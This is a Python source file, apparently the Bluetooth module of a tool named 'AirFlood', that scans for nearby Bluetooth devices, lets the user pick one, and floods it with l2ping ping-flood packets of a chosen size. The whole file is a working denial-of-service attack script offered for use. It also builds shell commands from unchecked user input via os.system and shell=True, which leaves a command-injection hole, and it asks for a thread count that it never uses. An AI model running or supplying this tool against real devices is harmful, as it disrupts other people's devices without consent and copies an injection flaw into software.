import os
import time
import subprocess

from utils import banner

ACCENT = banner.MODULE_THEMES["bluetooth"]["accent"]


def get_bluetooth_interface():
    banner.module_banner("bluetooth")
    banner.section("select a bluetooth interface", accent=ACCENT)
    interfaces = subprocess.check_output(
        "hciconfig | grep -E 'hci[0-9]+:|Bus|UP RUNNING|DOWN'", shell=True, text=True
    )
    print()
    print(interfaces)
    return banner.prompt("interface (e.g. hci0)", accent=ACCENT)


def scan_attack():
    while True:
        banner.module_banner("bluetooth")
        banner.section("bluetooth menu", accent=ACCENT)
        choice = banner.menu(
            [
                ("1", "Scan and attack", "discover nearby devices and flood one"),
                ("2", "Back", "return to the AirFlood main menu"),
            ],
            accent=ACCENT,
        )
        if choice == "1":
            bluetooth_interface = get_bluetooth_interface()
            break
        elif choice == "2":
            raise banner.BackToMenu()
        else:
            banner.warn("invalid choice, try again")

    banner.module_banner("bluetooth")
    banner.section("scanning for devices", accent=ACCENT)
    bluetooth_scan = subprocess.check_output(
        f"hcitool -i {bluetooth_interface} scan", shell=True, stderr=subprocess.STDOUT, text=True
    )
    lines = bluetooth_scan.splitlines()
    del lines[0]

    array = []
    print()
    print(f"  {'id':<5}{'mac address':<22}{'device name'}")
    print(f"  {'--':<5}{'-----------':<22}{'-----------'}")
    for index, line in enumerate(lines, start=1):
        info = line.split()
        device_mac = info[0]
        device_name = " ".join(info[1:])
        array.append(device_mac)
        print(f"  {index:<5}{device_mac:<22}{device_name}")

    target_id = banner.prompt("target id or mac address", accent=ACCENT)
    try:
        target_address = array[int(target_id) - 1]
    except (ValueError, IndexError):
        target_address = target_id

    if len(target_address) < 1:
        banner.error("target address is missing")
        raise banner.BackToMenu()

    try:
        packet_size = int(banner.prompt("packet size (max: 600)", accent=ACCENT))
        thread_size = int(banner.prompt("threads count", accent=ACCENT))
    except ValueError:
        banner.error("packet size and threads must be integers")
        raise banner.BackToMenu()

    banner.module_banner("bluetooth")
    banner.section("launching attack", accent=ACCENT)
    print(f"  target : {target_address}")
    print(f"  size   : {packet_size}")
    print(f"  threads: {thread_size}")
    banner.countdown(3, "attacking")

    try:
        os.system(f"l2ping -i {bluetooth_interface} -s {packet_size} -f {target_address}")
    except KeyboardInterrupt:
        banner.warn("attack aborted")


if __name__ == "__main__":
    try:
        scan_attack()
    except banner.BackToMenu:
        banner.info("bye.")
    except KeyboardInterrupt:
        time.sleep(0.1)
        banner.warn("aborted")
    except Exception as e:
        time.sleep(0.1)
        banner.error(str(e))
